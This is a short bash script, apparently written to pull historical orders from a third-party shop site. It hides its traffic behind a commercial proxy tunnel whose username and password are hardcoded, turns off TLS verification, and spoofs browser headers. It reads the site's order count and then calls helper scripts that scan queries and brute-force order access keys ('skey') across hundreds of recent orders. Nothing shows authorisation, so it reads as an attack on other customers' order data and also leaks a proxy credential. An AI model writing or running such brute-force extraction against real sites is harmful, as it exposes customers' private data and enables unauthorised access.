#!/bin/bash
# xinhe001 historical order extraction
set -euo pipefail
export QG_TUNNEL="${QG_TUNNEL:-http://15E27ADA-A-JP-T-300-S-xhdeep:661C21F2CC15@overseas-us.tunnel.qg.net:16538}"
export XINHE_SITE="${XINHE_SITE:-435}"
OUT="${XINHE_OUT:-/workspace/results_xinhe001/run_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUT"

echo "=== query substring scan ==="
python3 /workspace/xinhe001_history_export.py "$OUT/query" "${DELAY:-0.25}" 0

echo "=== ajax order skey brute ==="
ORDERS=$(python3 -c "
import json, os, requests
requests.packages.urllib3.disable_warnings()
p=os.environ['QG_TUNNEL']
s=requests.Session(); s.verify=False; s.proxies={'http':p,'https':p}
s.headers.update({'User-Agent':'Mozilla/5.0','Referer':'https://xinhe001.lol/shop/'})
s.get('https://xinhe001.lol/shop/',timeout=25)
print(json.loads(s.get('https://xinhe001.lol/shop/ajax.php?act=getcount',timeout=15).text).get('orders',5735))
")
START="${ORDERS}"
END=$((ORDERS - ${SKEY_RANGE:-400}))
python3 /workspace/xinhe001_skey_brute.py "$OUT/skey" "$START" "$END"
